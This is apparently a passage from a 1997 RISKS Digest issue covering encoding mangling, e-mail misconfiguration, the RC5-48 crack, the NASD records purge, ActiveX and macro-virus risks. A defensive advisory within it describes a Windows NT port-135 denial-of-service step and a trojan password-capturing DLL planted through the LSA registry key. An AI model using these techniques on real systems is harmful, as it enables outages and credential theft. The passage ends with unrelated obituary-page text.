of respect for the user (some alternate versions I considered showed less).

This article brings to mind the birth of the daughter of a teammate of mine.
Seems the chosen name of the child was Zoe (with diaeresis over the "e").
So my teammate sent around a note announcing this name.  However, shortly
after the note went out, people started asking him why in the world he'd
named the kid "ZoK".

Turns out that e-diaeresis is mapped as ctrl-K (or is it alt-K?) on our
system.  When the message was sent to other systems, however, the mail
software converted text that looked something like "Zo^K" to read simply as
"ZoK".

So another risk of computers is one of losing your identity -- on the day
you're born.

The deficiency of this proposal is demonstrated by the fact that it arrives
on my screen as "co=F6perate", "na=EFf", and "Bront=EB.".  My system is set
up to properly handle ISO 8859-1, which is the only reasonable extended
character set standard for use on the Internet.  It was already mangled in
the RISKS posting (I checked), and as far as I can guess it was presumably
mangled before it left Jon's machine.  I wish people wouldn't assume that
the way their machine handles non-ASCII characters is the same as everyone
else's.

Usenet (at least NNTP) is generally 8-bit transparent, and any European
soc.culture group will tell you that ISO 8859-1 usually works, though
some people's newsreaders may have to be told about it.  This post of
mine, however, goes out by e-mail (SMTP) and upper bits will be stripped,
so I can't demonstrate its use.

|&gt;   [Not a bad idea for folks who can deal with diaeresis, but

Well, I can handle diaereses all right, as long as they arrive in a form

[Mark Brader notes that this is in the Jargon File / New Hacker's
Dictionary, edited by Eric Raymond.  From version 3.3.3 of the Jargon File:
``Oddly enough, the word `emailed' is actually listed in the OED;
it means "embossed (with a raised pattern) or perh. arranged in a
net or open work".  A use from 1480 is given. The word is probably
derived from French `'emaill'e' (enameled) and related to Old
French `emmaille"ure' (network).  A French correspondent tells
us that in modern French, `email' is a hard enamel obtained by
heating special paints in a furnace; an `emailleur' (no final e) is
a craftsman who makes email (he generally paints some objects
(like, say, jewelry) and cooks them in a furnace).''

I recently received an e-mail reply that addressed someone else by name
about a topic I've never dealt with. My system logs did indicate that I'd
e-mailed the person earlier in the day, so I figured that I had replied to a
posting of theirs and forward a copy to them, and that they had replied to
the wrong message. I was, though, unable to find any previous postings by
that author, and so concluded that it had simply been so recent that the
search engines had not catalogued it yet.

After a day or so I finally realized what had happened. I had, a few weeks
prior, visited another site and had needed to send e-mail out from a WWW
browser on the lab computer I was using. I had configured my e-mail address
as the return address, and had given my server's address as the SMTP
gateway. I did not remember to de-configure them when I left, so the next
time someone send e-mail from that system's browser it not only claimed to
be me but also showed up in my server's logs.

So if you are using a lab computer, be sure to check the reply address
before starting to send mail. If you are replying to someone who might
have been using a lab computer, make sure the reply address matches
your expectations.

In <A HREF="/Risks/18.81.html">RISKS-18.81</A>, we noted that Ian Goldberg of U.C. Berkeley had cracked the
40-bit RC5 in 3.5 hours -- the first step in the RSA Data Security challenge
posed on 28 Jan 1997.  The second step was taken on 10 Feb 1997 by Germano
Caronni, a graduate student at the Swiss Federal Institute of Technology.
Caronni (with a lot of help from his friends) has recovered the key for text
encrypted with 48-bit RC5, with the help of 3,500 computers and attaining an
peak rate of 1.5 trillion keys searched per hour, over a period of 312
hours.  A press release from RSA (given some circulation in the media) on
gives some details.  Close to the median expected effort, about 57% of the
key space was exhausted.  The Caronni team is now working on the next
challenge, RC5-56.  It is easy to clone yourself through virtual
replication.  [In this case, the team has a lot of Caronnis!]

The National Association of Securities Dealers (NASD) is the self-regulatory
organization that oversees broker-dealers and their employees in the United
States. It maintains a database of brokers and any disciplinary action taken
against them, a database that the public can access by calling Disclosure,
Inc. (1-800-638-8241 in the U.S.)  It's a good idea before doing business
with a new broker-dealer or a new broker to call Disclosure to check if they
have been a problem for other investors in the past.

Unfortunately, the NASD has purged 20,000 records from their files.
According to the Associated Press,

The NASD said it inadvertently issued faulty guidelines telling
clerks that "revised'' rules allowed them to purge a broad range of
disciplinary data from the central registration depository.

The risks are (at least) threefold.  First, that investors will not have
access to this valuable information and that people may deal with
unscrupulous brokers as a result.  Second, other regulatory agencies that
rely upon the NASD's record will not be able to perform their functions.
Thirdly, the NASD itself will not be able to refer to past disciplinary
records on these brokers in deciding penalties in response to new
complaints.

The NASD believes it will be able to reconstruct its records in a couple of
months.

Summary of recent attacks that have become more well known.

These attacks have been discussed on NT Security mailing list but the
knowledge about them has not spread widely outside of the security mailing
list circle: NT CPU Port Attacks, NT DNS Denial Attack, NT Trojan Password
DLL.

* NT CPU Port Attacks

On NT 3.51 and NT 4.0, there are TCP ports that are open that when an
attacker connects to them, types in some random characters, and drops
the connection, the CPU on the machine goes to 100% usage.

For example, connect to TCP port 135 (RPC server), type in
"thiswilldoacpuattack" and disconnect.  Then check the CPU usage.  The
CPU will be at 100% usage and the machine will be noticeably slower.  It
is possible to kill and restart the rpcss process to stop the CPU usage.

DNS (TCP port 53 &amp; 65589) is susceptible to this attack as well.  In
16-bits, port 65589 is port 53.  65589 = 0x10035. 53 = 0x35

Solution:

On NT 4.0, there is filter capability to block all TCP ports except
needed critical ones.  You may want to enable that.

There is a hotfix available on
<A HREF="ftp://ftp.microsoft.com/bussys/winnt/winnt-public/fixes/usa/nt40/hotfixes-postSP2/RPC-fix">ftp://ftp.microsoft.com/bussys/winnt/winnt-public/fixes/usa/nt40/hotfixes-postSP2/RPC-fix</A>

There is a DNS beta that fixed the random character on the port attack.
It is available via ftp from rhino.microsoft.com, log on as DNSBeta with
a password of DNSBeta. In the /service_pack3/x86 directory there is a
file called DNS.EXE dated 1/26/97.

* NT DNS Denial Attack

If an attacker spoofs a response that the DNS never requested, DNS will
terminate.  There is an advisory on this available at
<A HREF="http://www.iss.net/lists/general/0118.html">http://www.iss.net/lists/general/0118.html</A>

Solution:

Currently, Microsoft is working on a solution.

* NT Trojan Password DLL

On NT 4.0 and 3.51, there is some entries in the registry that point to
a DLL that does not exist, that lets an attacker to put their own DLL in
place.  There is one DLL that will capture all password changes into a
file, so an attacker can obtain any passwords that get changed pertaining to
passwords residing on that machine.  Ideally for an attacker, placing the DLL
on a domain controller machine where most password changes can take place may
produce the greatest amount of password information.

More information is available with source code for the password changer
DLL at: <A HREF="ftp://ftp.iss.net/pub/lists/ntsecurity-digest.archive/v02.n114">ftp://ftp.iss.net/pub/lists/ntsecurity-digest.archive/v02.n114</A>
or Knowledge Base article <A HREF="http://www.microsoft.com/kb/articles/q151/0/82.htm">http://www.microsoft.com/kb/articles/q151/0/82.htm</A>

Solution:

To defend against this type of Trojan attack is to protect
access to your registry fiercely. A routine part of your security
maintenance checks should be to take a close look at this registry key:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Lsa\Notification Packages

Make sure that it does not contain any strange entries. NT 4.0 ships
with a single entry to this registry key:

FPNWCLN

If anything else in this registry entry, find out what it is and whether or
not it's needed. If not sure, remove the errant entry immediately.  Netware
requires the DLL, so if you already have installed the Netware DLL, then it
should have be installed admin-writable only.  If you do not have the
Netware DLL installed, make sure the register entry is blank.

In a German TV show, 3 East German hackers (remotely linked to in/famous
Chaos Computer Club) demonstrated how inherent risks of Microsoft`s ActiveX
technology can expropriate naive users.

The hackers prepared a Web page attracting interest of surfers ("Becoming
millionaire in 5 minutes"). When this Webpage was contacted via Microsoft`s
Internet Explorer, an ActiveX control would be downloaded into the victims
computer. This control would access Quicken (a program aimed at assisting
electronic banking) to generate a transaction form to transfer some
electronic cheque to some account specified by the hackers; this cheque
would be trans- mitted with the next collective remittance. This may be the
first "Hostile Control" which has been demonstrated in the public (btw:
several Hostile Java Applets have appeared at several Internet sites; as
such Hostile Applets as well as experiments with Java "viruses" have not
been publicly displayed, the broad public tends to assume that Java Applets
are "secure" :-).

According to some Microsoft expert, "all users should know" that ActiveX may
have such side-effects which may include sniffing of disks as well as remote
installation of software. A spokesman representing Microsoft Germany even
suggested to disable ActiveX if the system is used for purposes of
electronic fund transfer. Concerning general protective action against
malign effects of ActiveX, Microsoft suggests using its ActiveX
"certification" option: users should "only allow" remote access from
"trustworthy" programmers.  A 3-level scheme (low - medium -high) of trust
is supported. On "high", only controls with an "authenticode" are permitted;
no warning is given when such a code is detected. Any programmer can buy his
authenticode for 20 dollar.

Any risk? No risk if you regard Microsoft or its affiliated programmers as
"trustworthy".

Klaus Brunnstein (10 Feb 1997)

PS: concerning "trustworthiness": apart from many safety and security
problems, users owe Microsoft the deployment of the first Macro virus
(Concept.A), and the proliferation of several Wazzu`s which have escaped
from several Microsoft CD- ROMs and WWW pages to the "interested
public". Users will experience major problems with enhanced macro viruses to
work under Office 97, and users will see more platforms to be
attacked. Thanx to Microsoft :-)

While the security community has fully recognized the risk of accepting
controls from untrusted sources, it seems to have completely ignored a
secondary risk of an existing control being subverted in unexpected ways.
Perhaps all of the controls that come with MSIE are perfectly safe, and
can't be subverted in any way (no buffer overflows, no mistakes), but it
seems highly unlikely that _all_ controls are written so perfectly.

Since one is basically giving away control of ones desktop to a web author
by enabling ActiveX within a browser, many companies are avoiding the
technology like the plague. Filtering it out at ones firewall is hardly
effective, unless one were to parse through every HTML page and
automatically remove the components that drive ActiveX (i.e. VBscript, the
Object tag, etc). Not allowing ActiveX to be enabled in a web browser would
seem to be a minimum requirement, not allowing browsers that support ActiveX
would seem to be even better (and easier for a firewall implementation to
handle - if the firewall sees that the user agent supports it, it could
refuse to service it).

Until the vendor gives us more control over when/how a control gets _used_
(not just control over when they get downloaded), I'll personally avoid the
technology. I hope Dan Wallach's supposition that the vendors are working on
it is true, but if they are, they're keeping awfully quiet about it
(refusing to acknowledge that there even _is_ a problem). Of course, that's
nothing new. "Full disclosure" of security bugs has done more for improving
security in the last few years than 20 years of discussion about "risks" has
done (not to belittle the work done by the readers of _this_ mailing
list/newsgroup, I just wish vendors would recognize that todays risks are
tomorrows exploits).

Eastman Kodak Company has announced a product safety recall for some of its
digital cameras because their battery packs overheat and rupture when
charged.  Only about 1900 "professional" cameras in the DCS 420 and 460, and
AP NC 2000 series are affected.  Kodak will handle replacement requests at
(800) 698-3324 in the USA or through Kodak representatives overseas.

This is barely a computer RISK.  Ordinary cameras usually have tiny
batteries and no provision for connection to mains power.  So long as
"digital" means "using lots of electrical power" portable digital devices
may pose physical risks that older technologies do not engender.

Researchers at the University of Toronto say that drivers whose attention is
distracted while talking on a cellular phone are four times more likely to
be involved in an accident.  However, insurance companies do not plan to
raise insurance premiums, because accident rates have not increased overall.
The researchers also found little difference between the use of a receiver
or hands-free model of phone, indicating that the problem is one of mental,
rather than physical preoccupation. (*Toronto Globe &amp; Mail*, 13 Feb 97, A1;

In <A HREF="/Risks/18.81.html">RISKS-18.81</A> about the IRS axing the Tax System Modernization project, PGN
added a parenthetical comment:

&gt;&gt;Gross is proposing to contract out the processing of individual
returns to commercial firms (which raises all sorts of privacy issues),
although that is only a small portion of the processing demands.&lt;&lt;

This has shown up elsewhere, I guess expressing a concern that if the IRS
used commercial firms to process tax returns, the risks to taxpayer privacy
might *increase.* This concern must flow from a belief that a government
agency or employee is less likely to compromise the privacy of a return than
would a private sector employee.

Of course, the government agency usually has a monopoly on processing and
the government employee generally has little to fear as far as termination
of employment due to inapropriate handling of sensitive materials. So, I
think the motivation for meeting privacy standards is good deal stronger in
the private sector.

&gt;From a privacy perspective, I don't think too many of us would want a
government agency preparing our tax returns, handling our checking account,
or storing the records of counseling sessions - yet we routinely rely on
commercial firms for those private matters.

The real risk of outsourcing such processing will be the realization that
there are no defined policy/procedures/standards for what constitutes proper
handling to maintain some level of privacy. If encryption is to be used, how
strong? etc.

&gt;3. Cyber Promotions Inc got dinged twice this week.  .... federal court
&gt;barred them from falsifying their FROM: addresses.  ...

I assume the last one refers to the settlement between CP and AOL.  That is,
unfortunately, not what it said.

The settlement AOL and CP signed onto says that CP will not be legally
barred from sending e-mail to AOL's customers, but that they may do so only
from a specified list of domains (five domain names, to be precise).  AOL
customers who wish to receive these messages (and AOL people assure me that,
strange as it may seem, there are some who do!) can do so by disabling the
PreferredMail blocking system.

The benefit to AOL, of course, is that they will no longer have to update
their list of blocked domains daily with whatever new domains CP came up
with (some of which were not real, and some of which weren't even valid
domains).

In <A HREF="/Risks/18.81.html">RISKS-18.81</A>, Nathan Myers talks about a Word virus that apparently got
loose during a recent meeting of the C++ standards committee.

I have a few more remarks to add:

1. At the time of the meeting, Microsoft had had a program
available for more than a year that would detect and
remove such viruses.  Nevertheless, only a few committee
members had that program installed on their machines.

2. The present version of Word has automatic macro execution
turned off by default, so such viruses cannot propagate
without explicit user action.

3. Troff has had the capability for similar viruses for many
years.  I suspect that the reason it hasn't been a problem
has been the relatively smaller number of users.

Once the existence of Word macro viruses became known, I think
Microsoft acted reasonably promptly to make a defense available.  Yes,
they should have been aware of the possibility before that, but
I think it's going a bit too far to say they deserve to be sued.
Lots of software companies have done worse.

<P>
When I talk to people I often find that the first part of their newspaper they
turn is the Obituary column.  Sometimes you find that your
long time heroes have died, sometimes you find that they were still
alive and you didn't know, and sometimes you read about people who are
simply interesting. The Obituary page is a repository of the
names of people who fall into these categories.  Having looked at my
logs this page seems to fill a need - a lot of you are
calling. At the moment I am updating the page when the pile of
newspapers gets too big! I hope to improve my rate soon.
<P>
If you hear of a death that you think people should know about, you can
<A HREF="/Obituary/register.html">register it</A>.
Or else <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">mail me</A> some details of the person
(name, dates, cause of death, what they
are famous for - don't assume I will have heard of them...). If you
have a link where more information can be found about the person
then send that too. I would particularly like to make this page more
international and would appreciate regular reports from other newspaper
Obituary readers throughout the world.
<P>
The
<A HREF="/Obituary/memorial.html">Virtual Memorial Garden</A> is there for
<EM>anyone</EM> - famous or not - that you would like to have remembered.
Pets are perfectly acceptable and I will maintain a Pet's Corner for them.
To have an entry placed there please use the
<A HREF="/Obituary/remember.html">form</A> provided. I will accept
images and pages (provided they are not too large) if you would like to have
them included as well.
<P>
Before you ask, yes there are far more men than women in the listings.
This is due to my available sources of information and the fact that,
due to the nature of society, there are fewer famous women than men.
Also, let me stress that there
is nothing morbid about an interest in obituaries, so you dont't have to feel
guilty about reading this unless you want to.

Please Don't Get up is a wonderful newsletter produced by <A
HREF="mailto:roryb@cjnetworks.com">Eric Rohr</A> and dedicated to
forgotten (and some not so forgotten) celebrities on the anniversary
of their death. Each month there are features on particular people, a
calendar for the month with the names of people who died on which day,
and a section with information about recent deaths. Highly
recommended. Rory also has an obituary web page called <A

Outta Here!&quot;</A>.
